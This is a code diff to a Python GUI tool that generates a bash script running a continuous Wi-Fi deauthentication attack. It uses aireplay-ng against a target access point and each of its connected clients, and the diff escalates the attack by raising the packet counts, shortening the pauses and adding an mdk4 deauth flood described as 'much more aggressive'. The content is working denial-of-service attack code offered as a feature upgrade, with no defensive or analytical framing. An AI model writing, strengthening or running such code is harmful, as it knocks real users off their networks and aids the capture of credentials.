@@ -1163,21 +1163,25 @@ class MaximWindow(QMainWindow):
         script.write("(\n")
         script.write("  sleep 5\n")  # let airodump collect stations first
         script.write("  while true; do\n")
-        # Broadcast deauth (hits all clients)
-        script.write(f"    sudo aireplay-ng --deauth 10 -a $BSSID {iface} >/dev/null 2>&1\n")
-        script.write("    sleep 2\n")
-        # Also deauth each individual station from the airodump CSV for stronger effect
+        # MDK3/MDK4 style: mass broadcast deauth flood
+        script.write(f"    sudo aireplay-ng --deauth 50 -a $BSSID {iface} >/dev/null 2>&1\n")
+        script.write("    sleep 1\n")
+        # Target each individual station with heavy deauth
         script.write(f"    CAP_CSV=$(ls -t '{capture_prefix}'-*.csv 2>/dev/null | head -1)\n")
         script.write("    if [ -n \"$CAP_CSV\" ]; then\n")
-        # Station lines in the CSV contain BSSID in the associated-to field
         script.write("      grep -i \"$BSSID\" \"$CAP_CSV\" | grep -Ev \"^$BSSID\" | grep -E '^[0-9A-Fa-f]{2}:' | while IFS=, read -r STA REST; do\n")
         script.write("        STA=$(echo \"$STA\" | tr -d ' ')\n")
         script.write("        if [ -n \"$STA\" ]; then\n")
-        script.write(f"          sudo aireplay-ng --deauth 10 -a $BSSID -c $STA {iface} >/dev/null 2>&1\n")
+        script.write(f"          sudo aireplay-ng --deauth 50 -a $BSSID -c $STA {iface} >/dev/null 2>&1\n")
         script.write("        fi\n")
         script.write("      done\n")
         script.write("    fi\n")
-        script.write("    sleep 8\n")
+        # Also try mdk4 if available — much more aggressive deauth
+        script.write(f"    if command -v mdk4 >/dev/null 2>&1; then\n")
+        script.write(f"      echo $BSSID > /tmp/maxim_mdk_target\n")
+        script.write(f"      sudo timeout 10 mdk4 {iface} d -B /tmp/maxim_mdk_target -c $CHANNEL >/dev/null 2>&1\n")
+        script.write("    fi\n")
+        script.write("    sleep 3\n")
         script.write("  done\n")
         script.write(") &\n")
         script.write("DEAUTH_PID=$!\n\n")
